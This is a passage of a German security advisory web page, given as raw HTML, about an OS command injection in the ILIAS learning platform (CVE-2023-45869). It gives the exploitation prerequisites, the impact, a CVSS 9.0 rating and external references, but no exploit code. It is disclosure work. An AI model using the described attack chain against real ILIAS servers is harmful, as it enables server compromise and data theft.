800w, https://rehmeinfosec.de/_Resources/Persistent/d/b/9/d/db9d8e655be41251ba67b4e939437acb0bdd9a35/709895ecf7034379a7a81074719b5e08-1000x226.webp 1000w, https://rehmeinfosec.de/_Resources/Persistent/2/0/9/d/209d3d1cf71d4961abb41d4d6d2647f3d9aa0cdd/709895ecf7034379a7a81074719b5e08-1094x248.webp 1200w, https://rehmeinfosec.de/_Resources/Persistent/3/9/2/e/392e0f644aa5a854b2ee67c1bcaa657eec14573e/709895ecf7034379a7a81074719b5e08-1095x248.webp 1600w" sizes="(min-width: 800px) 1000px, (min-width: 480px) 800px, (min-width: 320px) 440px, 100vw" loading="lazy" alt="test" width="1095" height="248" /></div><div class="infosec-headline  distanceBottom30"><h2 class="text-black dark:text-white text-2xl font-semibold">Voraussetzungen für die Ausnutzung</h2></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p>Die Voraussetzungen für den aufgeschlüsselten Worst Case (Punkt 1) lauten wie folgt:<br>&nbsp;</p><ul><li>Ein Angreifer benötigt Zugriff auf einen Account mit mindestens den Rechten eines normalen Users.</li><li>Die vom Angreifer hinterlegte Payload muss durch eine User-Interaktion eines hoch priviligierten Nutzers (Administrator) über einen Seitenaufruf ausgelöst werden.</li><li>Die Funktionalität <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">HTML/Javascript erlauben</span> muss für ein beliebiges Modul, für welches ein User Schreibrechte hat, enabled sein.</li></ul><p><br>Sollte die Funktionalität <span class="font-mono px-2 py-[3px] bg-gray-200 dark:bg-gray-800 text-black dark:text-white rounded-md text-sm">HTML/Javascript erlauben</span> abgeschaltet sein, besteht die Schwachstelle <a target="_blank" rel="noopener external" href="https://owasp.org/www-community/attacks/Command_Injection" title="https://owasp.org/www-community/attacks/Command_Injection"><span class="text-red-600 dark:text-red-400">OS Command Injection</span></a> als solche weiterhin, kann dann aber nur mit Administrationsrechten oder (falls gegeben) durch eine andere <a target="_blank" rel="noopener external" href="https://owasp.org/www-community/attacks/xss/"><span class="text-red-600 dark:text-red-400">XSS</span></a> Schwachstelle eskaliert werden.</p></div><div class="infosec-headline  distanceBottom30"><h2 class="text-black dark:text-white text-2xl font-semibold">Auswirkungen</h2></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p>Diese Schwachstelle kann erhebliche Auswirkungen auf die Sicherheit der betroffenen ILIAS-Installation und des zugrunde liegenden Betriebssystem haben. Alle auf dem Server gespeicherten Daten, Dateien und Komponenten, die der Webserver-User mit gegebenen Rechten lesen, schreiben oder ausführen kann, sind potenziell betroffen. Ein Angreifer, der diese Schwachstelle erfolgreich ausnutzt, könnte zudem das System beschädigen oder weitere Angriffe (z.B. auf externe Dienste wie LDAP durch einsehbare Credentials) durchführen.</p></div><div class="infosec-headline  distanceBottom30"><h2 class="text-black dark:text-white text-2xl font-semibold">Bewertung</h2></div><div class="infosec-cvss border-t-8  distanceBottom30" style="border-image: repeating-linear-gradient(-45deg, transparent, transparent 16px, #ef4444 16px, #ef4444 32px) 8;"><div class="flex p-4 bg-gray-200 dark:bg-gray-800 rounded-b-md"><svg class="h-20 w-20 overflow-hidden fill-current align-middle" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg"><path class="fill-red-500" d="M895.010309 541.690722c-16.494845 0-29.690722-13.195876-29.690721-29.690722V271.835052c0-7.917526-5.938144-13.85567-13.85567-13.855671-87.092784 0-168.907216-33.649485-230.268042-95.670103l-98.969072-98.969072c-3.958763-3.298969-7.917526-3.958763-10.556701-3.958763C495.175258 59.381443 481.979381 46.185567 481.979381 29.690722S495.175258 0 511.670103 0c19.793814 0 37.608247 7.917526 51.463918 21.113402l98.969072 98.969072c50.14433 50.14433 117.443299 77.85567 188.701031 77.85567 40.247423 0 73.237113 32.989691 73.237113 73.237114v240.164948c0.659794 17.154639-12.536082 30.350515-29.030928 30.350516z" /><path class="fill-red-600" d="M511.670103 1024c-110.185567 0-213.773196-42.886598-291.628866-120.742268C142.185567 824.742268 99.298969 721.154639 99.298969 610.969072V271.835052c0-40.247423 32.989691-73.237113 73.237113-73.237114 71.257732 0 137.896907-27.71134 188.701031-77.85567l98.969073-98.969072C474.061856 7.917526 492.536082 0 511.670103 0 528.164948 0 541.360825 13.195876 541.360825 29.690722S528.164948 59.381443 511.670103 59.381443c-1.979381 0-5.938144 0.659794-9.896907 3.958763l-98.969072 98.969072C341.443299 224.329897 259.628866 257.979381 172.536082 257.979381c-7.917526 0-13.85567 5.938144-13.85567 13.855671v339.13402c0 94.350515 36.948454 182.762887 103.587629 250.061856 66.639175 66.639175 155.71134 103.587629 250.061856 103.587629 16.494845 0 29.690722 13.195876 29.690722 29.690721s-13.85567 29.690722-30.350516 29.690722z" /><path class="fill-red-500" d="M511.670103 1024c-16.494845 0-29.690722-13.195876-29.690722-29.690722s13.195876-29.690722 29.690722-29.690721c94.350515 0 182.762887-36.948454 250.061856-103.587629s103.587629-155.71134 103.587629-250.061856v-98.969072c0-16.494845 13.195876-29.690722 29.690721-29.690722s29.690722 13.195876 29.690722 29.690722v99.628866c0 110.185567-42.886598 213.773196-120.742268 291.628866-78.515464 77.85567-182.103093 120.742268-292.28866 120.742268z" /><path class="fill-red-600" d="M511.670103 349.030928l93.690722-93.690722L554.556701 204.536082l-42.886598 42.886598z" /><path class="fill-red-500" d="M511.670103 247.42268L216.742268 541.690722v81.814433c0 6.597938 0 12.536082 0.659794 19.13402l294.268041-294.268041V247.42268z" /><path class="fill-red-600" d="M511.670103 597.773196L780.206186 329.896907c-1.979381-0.659794-4.618557-0.659794-7.257732-0.659794-27.71134 0-54.103093-5.278351-79.175258-14.515464L511.670103 496.164948v101.608248z" /><path class="fill-red-500" d="M511.670103 496.164948L249.731959 758.762887c11.216495 21.773196 25.072165 42.226804 40.907216 60.041237l221.030928-221.030928V496.164948z" /><path class="fill-red-600" d="M511.670103 847.175258l294.927835-294.927835V451.298969L511.670103 745.56701z" /><path class="fill-red-500" d="M511.670103 745.56701l-138.556701 138.556701c23.752577 12.536082 48.824742 21.773196 74.556701 27.051547l64-64V745.56701z" /></svg><div class="ml-1"><div class="flex pt-3 text-red-500 text-bold"><div class="text-4xl -mt-1 font-bold">9.0</div><div class="text-lg ml-1 mt-2">Critical</div></div><div><a aria-label="cvss version" class="text-gray-800 dark:text-gray-300 -mt-1 break-all text-sm sm:text-base" href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/">CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H</a></div></div></div></div><div class="infosec-headline  distanceBottom15"><h4 class="text-sky-400 text-lg font-semibold">Exploitability Metrics</h4></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p><strong>Attack Vector (AV): N</strong><br>Es handelt sich um einen Netzwerkangriff. Die verwundbare Komponente ist "aus der Ferne ausnutzbar" und wird als ein Angriff betrachtet, der auf Protokollebene über das Internet stattfindet.</p><p><br><strong>Attack Complexity (AC): L</strong><br>Besondere Zugangsbedingungen oder mildernde Umstände bestehen nicht. Es MUSS jedoch für eine erfolgreiche Durchführung die Konfiguration "HTML/Javascript erlauben" gesetzt sein. Wenn eine bestimmte Konfiguration für den Erfolg eines Angriffs erforderlich ist, wird die anfällige Komponente nach CVSSv3.1 Spezifikation unter der Annahme bewertet, dass sie sich in dieser Konfiguration befindet.</p><p><br><strong>Privileges Required (PR): L</strong><br>Der Angreifer benötigt Privilegien, die grundlegende Benutzerfunktionen eines Users bereitstellen.</p><p><br><strong>User Interaction (UI): R</strong><br>Der platzierte Schadcode muss für einen erfolgreichen Angriff durch eine User-Interaktion eines Administrators ausgeführt werden.</p><p><br><strong>Scope (S): C</strong><br>Die anfällige Komponente ist die Webanwendung: Die Webanwendung überführt Systembefehle durch Benutzereingaben in eine exec() Funktion. Die betroffene Komponente ist der Webserver: Auf diesen erlangt der Angreifer Zugriff. Es kann sowohl auf das Dateisystem zugegriffen werden, als auch beliebig gespeicherte Daten aus anderen Komponenten (z.B. Datenbanken) extrahiert werden, welche bei normaler Nutzung der Web-Applikation nicht verfügbar sein sollten. Auch können auf dem Server befindliche Programme bzw. Binaries ausgeführt werden.</p><p><br><strong>Confidentiality (C): H</strong><br>Bei einem erfolgreichen Angriff kommt es zu einem totalen Verlust der Vertraulichkeit. Alle Ressourcen innerhalb der betroffenen Komponente und weiterführend Komponenten des Betriebssystems werden dem Angreifer offengelegt.</p><p><br><strong>Integrity (I): H</strong><br>Bei einem erfolgreichen Angriff kommt es zu einem totalen Verlust der Integrität. Der Angreifer ist in der Lage, alle geschützten Dateien der betroffenen Komponente und weiterführend Dateien aus Komponenten des Betriebssystems zu verändern.</p><p><br><strong>Availability (A): H</strong><br>Bei einem erfolgreichen Angriff ist der Angreifer in der Lage, den Zugang zu den Ressourcen der betroffenen Komponente und weiterführend aus Komponenten des Betriebssystems vollständig zu verweigern. Zum Beispiel durch das Löschen von Dateien.</p></div><div class="infosec-headline  distanceBottom30"><h2 class="text-black dark:text-white text-2xl font-semibold">Externe Informationen</h2></div><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p><strong>heise online</strong></p><p><a target="_blank" rel="noopener external" href="https://www.heise.de/news/NATO-und-Behoerden-von-kritischer-Luecke-in-Lernplattform-ILIAS-betroffen-9344057.html">https://www.heise.de/news/NATO-und-Behoerden-von-kritischer-Luecke-in-Lernplattform-ILIAS-betroffen-9344057.html</a></p><p>&nbsp;</p><p><strong>CVE (MITRE)</strong></p><p><a target="_blank" rel="noopener external" href="https://www.cve.org/CVERecord?id=CVE-2023-45869">https://www.cve.org/CVERecord?id=CVE-2023-45869</a></p><p>&nbsp;</p><p><strong>NIST (National Vulnerability Database)</strong></p><p><a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2023-45869" rel="nofollow noopener external">https://nvd.nist.gov/vuln/detail/CVE-2023-45869</a></p></div></div></div></div></section><footer class="relative overflow-hidden"><div class="mx-auto max-w-screen-xl space-y-8 px-4 py-16 sm:px-6 lg:space-y-16 lg:px-8"><div class="grid grid-cols-1 gap-8 lg:grid-cols-3"><div><div class="text-gray-800 dark:text-sky-100 flex items-center"><svg xmlns="http://www.w3.org/2000/svg" class="h-14 md:h-16 rotate-45" viewBox="0 0 87.5 115.5" fill="none"><g id="logo-svg" data-name="logo-svg"><g id="logo-left"><path fill="currentColor" d="M72.5,44.5,83,31,58,0H46l.5,83.5h11v-21l7-8,14,19,9-10Zm-15-2v-23l10,12Z" /></g><g id="logo-right"><path fill="currentColor" d="M15,71,4.5,84.5l25,31h12L41,32H30V53l-7,8L9,42,0,52Zm15,2V96L20,84Z" /></g></g></svg><span class="hidden sm:block pl-6 text-lg text-gray-800 dark:text-white">rehme.infosec</span></div><p class="mt-4 max-w-xs"><div class="neos-contentcollection"><div class="infosec-text text-gray-700 dark:text-gray-400  distanceBottom30"><p>Piiip, in <a target="_blank" rel="noopener external" href="https://renerehme.de">meinem persönlichen Blog</a> veröffentliche ich Artikel über IT-Security, persönliche Projekte, Coding Experimente oder Basteleien. Im Labor findest du aktuelle Veröffentlichungen von gefunden Sicherheitslücken in Software.</p></div></div></p><ul class="mt-8 flex gap-6"><li><a href="https://www.linkedin.com/company/100283045/" rel="noreferrer" target="_blank" aria-label="Link" class="text-gray-700 transition hover:opacity-75"><span class="sr-only">LinkedIn</span><svg fill="currentColor" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z" /></svg></a></li><li><a href="https://www.xing.com/pages/rehme-infosec" rel="noreferrer" target="_blank" aria-label="Link" class="text-gray-700 transition hover:opacity-75"><span class="sr-only">XING</span><svg fill="currentColor" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-14.085 15l2.744-4.825-1.846-3.162h3.292l1.83 3.152-2.744 4.835h-3.276zm8.79-1.445l3.514 6.445h-3.252l-3.55-6.445 5.38-9.555h3.289l-5.381 9.555z" /></svg></a></li></ul></div><div class="grid grid-cols-1 gap-8 sm:grid-cols-2 lg:col-span-2 lg:grid-cols-4"><div><p class="font-medium text-gray-800 dark:text-sky-100">Services</p><ul class="mt-6 space-y-4 text-sm"><li><a href="/leistungen/penetrationstests-red-teaming" aria-label="Link" title="Penetration Testing" class="text-gray-500 transition hover:opacity-75">Penetration Testing</a></li><li><a href="/leistungen/penetrationstests-red-teaming" aria-label="Link" title="Red-Teaming" class="text-gray-500 transition hover:opacity-75">Red-Teaming</a></li><li><a href="/leistungen/code-audits" title="Code Audits" aria-label="Link" class="text-gray-500 transition hover:opacity-75">Code Audits</a></li></ul></div><div><p class="font-medium text-gray-800 dark:text-sky-100">Unternehmen</p><ul class="mt-6 space-y-4 text-sm"><li><a href="/unternehmen" title="Über uns" aria-label="Link" class="text-gray-500 transition hover:opacity-75">Über uns</a></li></ul></div><div><p class="font-medium text-gray-800 dark:text-sky-100">Nützliche Links</p><ul class="mt-6 space-y-4 text-sm"><li><a href="/labor/responsible-disclosure" aria-label="Link" class="text-gray-500 transition hover:opacity-75">Responsible Disclosure</a></li><li><a href="/alle-it-sicherheitshinweise-des-cert-bund" aria-label="Link" class="text-gray-500 transition hover:opacity-75">IT-Sicherheitshinweise des CERT-Bund</a></li></ul></div><div><p class="font-medium text-gray-800 dark:text-sky-100">Legal</p><ul class="mt-6 space-y-4 text-sm"><li><a href="/impressum" aria-label="Link" class="text-gray-500 transition hover:opacity-75">Impressum</a></li><li><a href="/datenschutz" aria-label="Link" class="text-gray-500 transition hover:opacity-75">Datenschutz</a></li></ul></div></div></div><p class="text-xs text-gray-500">&copy; rehme.infosec 2024, alle Rechte vorbehalten</p></div><div id="footerEffect" aria-hidden="true" class="absolute w-screen h-auto bottom-0 left-0 text-black dark:text-sky-300 opacity-50 dark:opacity-20 text-lg leading-none select-none pointer-events-none" style="line-height: 12px;"></div></footer><script data-neos-node="/sites/rehme-site/node-kum1r0bruqmmz/node-uu2959yjqgdsa@live;language=de" src="https://rehmeinfosec.de/_Resources/Static/Packages/Neos.Neos/JavaScript/LastVisitedNode.js" async></script></body></html>